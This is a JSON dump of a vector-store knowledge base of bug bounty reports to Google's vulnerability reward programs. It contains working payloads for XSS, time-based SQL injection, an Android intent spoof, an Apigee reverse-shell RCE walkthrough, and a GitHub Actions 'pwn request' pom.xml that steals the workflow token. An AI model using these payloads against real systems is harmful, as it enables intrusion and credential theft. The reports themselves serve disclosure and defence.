"D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_354319.clean.txt", "file_name": "20250408_175654_354319.clean.txt", "file_type": "text/plain", "file_size": 1144, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "9f9916b2-c6c0-469e-8990-2c9ef720981b", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_354319.clean.txt", "file_name": "20250408_175654_354319.clean.txt", "file_type": "text/plain", "file_size": 1144, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "4c9c4f1966d05264afa6428b8eaa2b17a7127dfb81172b5d1671a925319aeece", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\naccess_token leak on\r\nhttps://edit.chromium.org/\r\nProduct:\r\nURL:\r\nhttps://edit.chromium.org/edit?file=https%3A%2F%2Fandroid.googlesource.com%2Fexample.com%23.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md%27\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nWhen signed in to the Git Source Editor and going to the URL it sends your OAuth token to\r\nhttps://example.com/?access_token=<TOKEN>\r\nNormally URLs would be restricted to\r\n*.googlesource.com\r\nor\r\n*.git.corp.google.com\r\nThis app seems to be owned by the Android Build Team\r\nhttp://android-build.corp.google.com/\r\nAttack scenario\r\nGoing to an attacker controlled URL leaks a token which looks to be the OAuth token for the trusted google app used for making changes to chromium and android.\r\nThe scope looks to be:\r\n\"email profile\r\nhttps://www.googleapis.com/auth/userinfo.profile\r\nopenid\r\nhttps://www.googleapis.com/auth/gerritcodereview\r\nhttps://www.googleapis.com/auth/androidbuild.internal\r\nhttps://www.googleapis.com/auth/userinfo.email\"\r\nmaybe after loading the resource it could be \"escalated\" to XSS but that be a bit pointless.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1144, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "45fdcec5-4853-4b0f-9788-712b9e9d8a53": {"__data__": {"id_": "45fdcec5-4853-4b0f-9788-712b9e9d8a53", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_532452.clean.txt", "file_name": "20250408_175640_532452.clean.txt", "file_type": "text/plain", "file_size": 579, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "3d57880b-67e9-4159-b211-c3b8e4eafe23", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_532452.clean.txt", "file_name": "20250408_175640_532452.clean.txt", "file_type": "text/plain", "file_size": 579, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "1e940cff576b06c6718f7448918bc8fa36ebc7e35ec6895402ae444add626030", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Unauthorized Access to Chronograf InfluxDB Admin Portal on Open Port 8083 on Ip address 216.73.89.76.\r\nGoogle Drive Link:\r\nhttps://drive.google.com/drive/folders/1AdTp62KZW6dxtkVxhKRGBbGhp-ByC3sB?usp=sharing\r\nSteps to reproduce:\r\n1) Open a web browser.\r\n2) Navigate to\r\nhttp://216.73.89.76:8083/sources/1/status\r\nObserve that the admin interface is accessible without requiring login credentials.\r\nBrowser/OS: Chromium / Ubuntu 22.04\r\nAttack scenario:\r\nAny third party user can access the given affected URL via simply entering the IP and port number on the web browser.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 579, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "4be3a1a1-6ae6-47b6-b048-dc771f0b1895": {"__data__": {"id_": "4be3a1a1-6ae6-47b6-b048-dc771f0b1895", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_601802.clean.txt", "file_name": "20250408_175656_601802.clean.txt", "file_type": "text/plain", "file_size": 3326, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c3a11a58-224e-4411-a391-c2743e4ba937", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_601802.clean.txt", "file_name": "20250408_175656_601802.clean.txt", "file_type": "text/plain", "file_size": 3326, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "1630e82610a39e3dda8788542d81c2398328f168d0d18a325ea986a7dd900acb", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nRemote Code Execution vulnerability in LookupCache policy in Google Apigee allows attacker to execute arbitrary Java code by specially crafted cache entry\r\nProduct:\r\nApigee\r\nVulnerability type:\r\nRemote Code Execution (RCE)\r\nDetails\r\nHi Google Security team,\r\nUsing policies for general purpose caching, you can persist any objects your proxy requires across multiple request/response sessions\r\nI noticed that when Apigee retrieves cache entry, it also invokes postDeserialize() method on the retrieved entry value, if entry value is an object of com.apigee.util.PostDeserializer class. Moreover, execution of this method is not sandboxed with Java Permissions, which opens a possibility to run arbitrary code.\r\nAttack scenario\r\nThe vulnerability can be exploited by a remote attacker.\r\nThe attacker can execute arbitrary Java code. The attacker can bind a reverse shell.\r\nIn short, to exploit this you need to:\r\nCraft special object, which must be an implementation of com.apigee.util.PostDeserializer class. This object must contain postDeserialize() method with arbitrary Java code.\r\nPut this object into some message context variable.\r\nPut message context variable into the cache via PopulateCache policy.\r\nRetrieve the object via LookupCache policy.\r\nI have created PoC proxy for you as well as Java project.\r\nSteps to Reproduce\r\nSetup reverse shell listener on your publicly available server with the following command:\r\nnc -lvnp 8899\r\nDownload PoC proxy from the attachments (java-and-cache-rce_rev3_2023_03_15.zip).\r\nCreate a proxy in the Apigee UI and upload PoC proxy bundle into it.\r\nDownload Java project from the attachments (demo.zip).\r\nUnzip and open Java project in your favorite IDE (you need Java 11/OpenJdk 11).\r\nOpen src/main/java/com/apigeesamplerce/App.java.\r\nOn the line 18 change IP 35.205.178.244 to the IP address of your publicly available server. You can also change a port if you want. Save the file.\r\nBuild Java project with the following commands:\r\nmvn install:install-file \\\r\n-Dfile=expressions-1.0.0.jar \\\r\n-DgroupId=com.apigee.edge \\\r\n-DartifactId=expressions \\\r\n-Dversion=1.0.0 \\\r\n-Dpackaging=jar \\\r\n-DgeneratePom=true\r\n-Dfile=message-flow-1.0.0.jar \\\r\n-DartifactId=message-flow \\\r\n-Dfile=util-1.0.0.jar \\\r\n-DartifactId=util \\\r\nmvn clean package\r\nAfter successful building locate demo-1.0-SNAPSHOT.jar under target directory in the Java project.\r\nUpload demo-1.0-SNAPSHOT.jar into your proxy via Apigee UI. You can do it by clicking on Add Resource button (\u2795) on Resources directory on the left side of Develop Tab of the Apigee UI - choose JAR resource type, choose demo-1.0-SNAPSHOT.jar as file and click Add.\r\nSave revision and deploy your proxy.\r\nReplace DOMAIN in the following command with domain name of the Apigee instance. Trigger reverse shell by sending get request to your proxy.\r\ncurl https://DOMAIN/java-and-cache-rce/rce\r\nObserve reverse shell connection\r\nPoC explanation\r\nPoC proxy contains 3 policies:\r\nJAVA-1 - JavaCallout policy which creates malicious object with reverse shell payload and stores this object in\r\ncache_str\r\ncontext variable.\r\nPC-1 - PopulateCache policy, which takes malicious object from\r\ncontext variable and puts it into a cache\r\nLC-1 - LookupCache policy, which retrieves the object from the cache and executes its postDeserialize() method", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3324, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "9e18868d-6d96-4f99-8a27-735b66ee7f2d": {"__data__": {"id_": "9e18868d-6d96-4f99-8a27-735b66ee7f2d", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_290088.clean.txt", "file_name": "20250408_175647_290088.clean.txt", "file_type": "text/plain", "file_size": 2242, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "d17ba352-18c1-4255-bb81-1e691542e20a", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_290088.clean.txt", "file_name": "20250408_175647_290088.clean.txt", "file_type": "text/plain", "file_size": 2242, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "73b7cadd0e421fda833dee00223a6517245099faf30b6d57cacb92140600128d", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nWeb app install spoof via intent\r\nProduct:\r\nURL:\r\nhttps://play.google.com/store/apps/details?id=com.google.android.googlequicksearchbox\r\nVulnerability type:\r\nSecurity UI Spoofing\r\nDetails\r\nThe following has been forwarded from\r\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=1520159\r\nas requested by [REDACTED_EMAIL] \"get me cc'd on them so I can help provide context\"\r\nOn an android device run the following code on any website then click on the page.\r\nonclick = () => {\r\nlocation.href='intent://search.app.goo.gl/?link=\r\nhttps://www.google.com/hsi?name%3DChrome%26icon%3Dhttps://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png%26ve%3D145828%26hv%3D1%26dest%3D1%26source%3Dhomescreen_shortcut%26query%3Dhttps%3A%2F%2Fndev.tk%23Intent;scheme%3Dhttps;package%3Dcom.google.android.googlequicksearchbox;end&apn=com.google.android.googlequicksearchbox#Intent;package=com.google.android.gms;scheme=https;end;'\r\nlocation.href='\r\nhttps://www.google.com'\r\n;\r\n}\r\nIts also possible to skip the add to home screen step like this: (Sandboxed main frame escape)\r\nintent://\r\nwww.google.com/gasearch?q=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end\r\nA fix would need to cover both firebase (com.google.android.gms) and using the intent directly.\r\nAttack scenario\r\nPlease see video for PoC :)\r\nFrom any website:\r\nNo origin is displayed on the install prompt and the icon is chosen by the attacker, attacker controlled page is shown in a google app webview (seems to work differently then a normal page load)\r\nThe origin\r\nhttps://www.google.com\r\nwas shown before a prompt was given.\r\nIt seems strange that  browser intents cant be origin scoped like stuff for google does not need to be allowed for every site, maybe that could change.\r\nSome quotes:\r\n\"It does seem like this has spoof potential\"\r\n\"The shortcut spoof is probably also low sev, but definitely something that should be fixed as I see no reason for google search app to be allowing untrusted sites to request shortcut install (even if non-malicious) on link click.\r\nIn any case, neither of these issues are fixable in Chrome (short of blocklisting google search app), and should be reported to the google search app.\"", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2242, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "297b1001-62db-45c2-b061-872aa7777136": {"__data__": {"id_": "297b1001-62db-45c2-b061-872aa7777136", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_710647.clean.txt", "file_name": "20250408_172348_710647.clean.txt", "file_type": "text/plain", "file_size": 1189, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "5d4a87fe-1111-4623-98e4-3cbc7324a13e", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_710647.clean.txt", "file_name": "20250408_172348_710647.clean.txt", "file_type": "text/plain", "file_size": 1189, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "f1d682f4cd3c1d8157035b8a0ddb3f163abd6ce0f70930643df6d620045762ee", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nI have discovered a Reflected Cross-Site Scripting (XSS) vulnerability on one of the domains associated with a Google acquisition. This vulnerability allows an attacker to inject and execute malicious\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://span.sproute.net/\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nSteps to Reproduce:\r\nAccess the affected URL using the payload embedded in the query parameter:\r\nhttps://span.sproute.net/signin/?email=asdf\"><script>alert(document.domain)</script>#/\r\nThe email parameter reflects the payload directly into the HTML without proper sanitization or encoding.\r\nAs a result, the payload executes, displaying the domain name (span.sproute.net) in an alert box.\r\nAttack scenario\r\nThe vulnerability can be exploited by anyone who persuades a user to click on a specially crafted malicious link. Once the user clicks, the injected script executes in their browser, allowing the attacker to potentially steal sensitive data like session cookies, impersonate the user, or perform unauthorized actions on their behalf. This could lead to unauthorized access, data theft, or further exploitation of the victim\u2019s account or the system itself.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1187, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "515f5045-3502-4b85-893f-a294f931d188": {"__data__": {"id_": "515f5045-3502-4b85-893f-a294f931d188", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_459236.clean.txt", "file_name": "20250408_175640_459236.clean.txt", "file_type": "text/plain", "file_size": 2345, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "406ede81-16f6-4035-a1bc-a13bea2cf843", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_459236.clean.txt", "file_name": "20250408_175640_459236.clean.txt", "file_type": "text/plain", "file_size": 2345, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "06b08cf5010dfc1f71ae1b867f45d2cad6c3e351aaf062837c5590fb9b1b595b", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nSQL injection in zombo.googleprod.com via app parametar\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://zombo.googleprod.com/horde/login.php\r\nVulnerability type:\r\nSQL Injection (SQLi)\r\nDetails\r\nWhat is googleprod.com?\r\nGoogleprod.com appears to be a domain associated with Google's production environment. It is used internally for various services and applications. Access to this domain is typically restricted to Google's internal network and is not intended for public use.\r\nIssue detail\r\nThe app parameter appears to be vulnerable to SQL injection attacks. The payload '+(select*from(select(sleep(20)))a)+' was submitted in the app parameter. The application timed out when responding to the request, indicating that the injected SQL command caused a time delay.\r\nThe database appears to be MySQL.\r\nPoC:\r\nRequest:\r\nPOST /horde/login.php HTTP/2\r\nHost: zombo.googleprod.com\r\nCookie: Horde=7heb8ntc9c73molesaa3as6ov6; webmail-choice=roundcube; roundcube_sessid=rfblae21v5uvgnv4sroisduqif; interworx-cp=hbm1qpcotsqne7hc4ov6v13b8q\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 157\r\nOrigin: https://zombo.googleprod.com\r\nReferer: https://zombo.googleprod.com/horde/login.php\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-User: ?1\r\nPriority: u=1\r\nTe: trailers\r\napp='%2b(select*from(select(sleep(20)))a)%2b'&login_post=1&url=&anchor_string=&horde_user=Username&horde_pass=Password&horde_select_view=basic&new_lang=en_US\r\nResponse:\r\nsee photo\r\nAttack scenario\r\nSQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\r\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2345, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "e011446b-623d-4df5-82a2-105fe9fcc010": {"__data__": {"id_": "e011446b-623d-4df5-82a2-105fe9fcc010", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_610862.clean.txt", "file_name": "20250408_175719_610862.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "ccbca342-30a8-40f5-95b1-5312b5c4d20b", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_610862.clean.txt", "file_name": "20250408_175719_610862.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "6bb765c2ec0ad5b157c42604858c29e7799632916f87d742206970863bb2ba7c", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 0, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "f3a5baf0-ac27-455c-8992-ed57bf857da6": {"__data__": {"id_": "f3a5baf0-ac27-455c-8992-ed57bf857da6", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_096710.clean.txt", "file_name": "20250408_175638_096710.clean.txt", "file_type": "text/plain", "file_size": 5336, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "e8025ce9-df34-4037-b000-dd1f7a3b1139", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_096710.clean.txt", "file_name": "20250408_175638_096710.clean.txt", "file_type": "text/plain", "file_size": 5336, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "75c3ac9b544b68abbc5bc2ad3a6fd1783cd90b06483a441a47a0f8386dfafce4", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "560e22f2-bce4-4c91-bacb-eb0c8fe84eba", "node_type": "1", "metadata": {}, "hash": "9c1250cbd4b150c0de8f0c40af8e751d32110f92e24df3350a6d4077cb4074b4", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nGoogle Cloud Data Fusion, built upon the open-source CDAP code, has multiple GitHub Actions \"pwn request\" vulnerabilities allowing RCE and build artifact compromise\r\nProgram:\r\nOSS VRP\r\nURL:\r\nhttps://github.com/data-integrations/google-cloud/blob/develop/.github/workflows/build.yml\r\nVulnerability type:\r\nRemote Code Execution (RCE)\r\nDetails\r\nVideo walk-through\r\nI made a video walk-through demonstrating that attack:\r\nhttps://drive.google.com/file/d/1OOEEMrQW9bJS7PrbyybKheabUBTKuT-c/view?usp=sharing\r\nIntroduction\r\nGoogle Cloud Data Fusion is built upon the open-source CDAP code, developed by Cask Data and acquired by Google in 2018. The CDAP project, maintained by Google staff, exists today within the GitHub organization \"data-integrations,\" which is clearly labeled as an official Google product and in scope for the Google Bug Bounty program (\r\nhttps://github.com/data-integrations/google-cloud/blob/develop/SECURITY.md\r\n).\r\nObservations\r\nGitHub Actions Workflows:\r\nMost public repositories in the \"data-integrations\" organization use GitHub Actions workflows.\r\nThese workflows DO NOT trigger on the more risky\r\npull_request_target\r\nevent.\r\nThe \"cdapio\" GitHub organization is also clearly labeled \"CDAP is now part of Google Cloud\" and exhibits the same problems that we highlight below.\r\nWorkflow Run Triggers:\r\nApproximately 22 repositories have workflows triggering on the\r\nworkflow_run\r\nevent without a\r\nbranches:\r\nfilter. If we also consider the \"cdapio\" organization there are 5 more repositories also affected there.\r\nThese workflows use the\r\nactions/checkout@v3\r\nstep to check out untrusted code from incoming pull requests, by specifying\r\n${{ github.event.workflow_run.head_sha }}\r\n.\r\nTrigger Workflow:\r\nThe\r\nworkflows are triggered by a workflow named\r\nTrigger build\r\n(\r\ntrigger.yml\r\n), which exists in all those repositories.\r\nComments in\r\nindicate a clear understanding of the risks on the part of the engineers who wrote the workflow, by requiring manual review and a PR label\r\nbuild\r\nto run Maven tests on untrusted code from forks.\r\nVulnerability Exploitation\r\nAn attacker can exploit this setup by:\r\nSubmitting a Malicious Pull Request:\r\nCreate a draft PR containing a new\r\n.github/workflows/whatever.yml\r\nthat triggers on\r\non: pull_request\r\n, with the\r\nname: Trigger Build\r\nThis workflow will obviously not have access to any secret and simply needs to succeed (i.e.,\r\nexit 0\r\nTriggering the Build Workflow:\r\nThe successful execution of the malicious workflow triggers the\r\nbuild.yml\r\nworkflow.\r\nThis classic \"pwn request\" scenario allows the attacker to exploit Maven's interpretation of a maliciously crafted\r\npom.xml\r\nPotential Consequences:\r\nworkflow inherits the old insecure defaults without explicit\r\nGITHUB_TOKEN\r\npermissions:\r\ndown-scoping, meaning we could confirm by looking at actions logs that it has full\r\nwrite\r\naccess.\r\nEven with settings like \"Require approval for first-time contributors,\" a threat actor can social engineer the repo maintainer to accept a benign PR, promoting their author association from \"first-time contributor\" to \"contributor,\" then enabling stealthy attack execution.\r\nSelf-Hosted Runner Risks:\r\nMost of those workflows run on a self-hosted runner labeled\r\nk8s-runner-build\r\nEvidence found in run logs indicate that the self-hosted runner is almost certainly non-ephemeral, allowing potential \"Runner-on-Runner\" attacks where an attacker can implant their own self-hosted runner on the same VM and use it as a C2 to establish persistence.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3516, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "560e22f2-bce4-4c91-bacb-eb0c8fe84eba": {"__data__": {"id_": "560e22f2-bce4-4c91-bacb-eb0c8fe84eba", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_096710.clean.txt", "file_name": "20250408_175638_096710.clean.txt", "file_type": "text/plain", "file_size": 5336, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "e8025ce9-df34-4037-b000-dd1f7a3b1139", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_096710.clean.txt", "file_name": "20250408_175638_096710.clean.txt", "file_type": "text/plain", "file_size": 5336, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "75c3ac9b544b68abbc5bc2ad3a6fd1783cd90b06483a441a47a0f8386dfafce4", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "f3a5baf0-ac27-455c-8992-ed57bf857da6", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_096710.clean.txt", "file_name": "20250408_175638_096710.clean.txt", "file_type": "text/plain", "file_size": 5336, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "fe5a7e6d4fc42430abc1c7b802e7fcad3b1ee83653aee9b6e77fdb6a865efefe", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "This classic \"pwn request\" scenario allows the attacker to exploit Maven's interpretation of a maliciously crafted\r\npom.xml\r\nPotential Consequences:\r\nworkflow inherits the old insecure defaults without explicit\r\nGITHUB_TOKEN\r\npermissions:\r\ndown-scoping, meaning we could confirm by looking at actions logs that it has full\r\nwrite\r\naccess.\r\nEven with settings like \"Require approval for first-time contributors,\" a threat actor can social engineer the repo maintainer to accept a benign PR, promoting their author association from \"first-time contributor\" to \"contributor,\" then enabling stealthy attack execution.\r\nSelf-Hosted Runner Risks:\r\nMost of those workflows run on a self-hosted runner labeled\r\nk8s-runner-build\r\nEvidence found in run logs indicate that the self-hosted runner is almost certainly non-ephemeral, allowing potential \"Runner-on-Runner\" attacks where an attacker can implant their own self-hosted runner on the same VM and use it as a C2 to establish persistence.\r\nPOC\r\nBogus Workflow\r\nname: Trigger build\r\njobs:\r\nwhatever:\r\nruns-on: ubuntu-latest\r\nsteps:\r\n- run: exit 0\r\nMaliciously craft pom.xml\r\n...\r\n<profile>\r\n<id>cloudBuild</id>\r\n<activation>\r\n<property><name>cloudBuild</name></property>\r\n</activation>\r\n<build>\r\n<plugins>\r\n<plugin>\r\n<groupId>org.codehaus.mojo</groupId>\r\n<artifactId>exec-maven-plugin</artifactId>\r\n<version>3.1.1</version>\r\n<executions>\r\n<execution>\r\n<id>run-after-clean</id>\r\n<phase>clean</phase>\r\n<goals>\r\n<goal>exec</goal>\r\n</goals>\r\n<configuration>\r\n<executable>/bin/bash</executable>\r\n<arguments>\r\n<argument>-c</argument>\r\n<argument>export GH_TOKEN=$(cat .git/config | grep extraheader | cut -d' ' -f5 | base64 --decode | cut -d: -f2); gh api --method PUT /repos/$GITHUB_REPOSITORY/contents/pwned.txt -f branch=feature/next-release -f message=pwn -f content=cHduZWQgYnkgdmlrb3JpdW0K</argument>\r\n</arguments>\r\n</configuration>\r\n</execution>\r\n</executions>\r\n</plugin>\r\nAttack scenario\r\nAny GitHub user has the ability to open a pull request from a fork against the repositories to exploit this vulnerability. This includes both first-time contributors and existing contributors.  The initial exploitation does not require any special permissions or secrets.\r\nWhat They Gain When Doing So\r\nBy exploiting this vulnerability, an attacker can:\r\nTrigger a workflow that runs untrusted code in the context of the GitHub Actions workflow with access to build-time secrets.\r\nExecute arbitrary code, which ultimately allow compromising signed down-stream artifacts on Maven Central.\r\nAllow further manipulation of the repository, such as modifying existing PRs, pushing malicious code, or deleting evidence of the attack of the attack.\r\nEstablish persistence on the non-ephemeral self-hosted runner to potentially execute further attacks within the infrastructure.", "mimetype": "text/plain", "start_char_idx": 2532, "end_char_idx": 5336, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "ea95c5be-eb99-4713-aa51-ebfb0a4132e5": {"__data__": {"id_": "ea95c5be-eb99-4713-aa51-ebfb0a4132e5", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_938739.clean.txt", "file_name": "20250408_175705_938739.clean.txt", "file_type": "text/plain", "file_size": 2348, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "f591bc8d-81cf-40cc-b244-14ee0a71a929", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_938739.clean.txt", "file_name": "20250408_175705_938739.clean.txt", "file_type": "text/plain", "file_size": 2348, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "64562ac05a3c140e40ea68745325722d2df6fd2e08fe94ecfe544dde3277e8e2", "class_name": 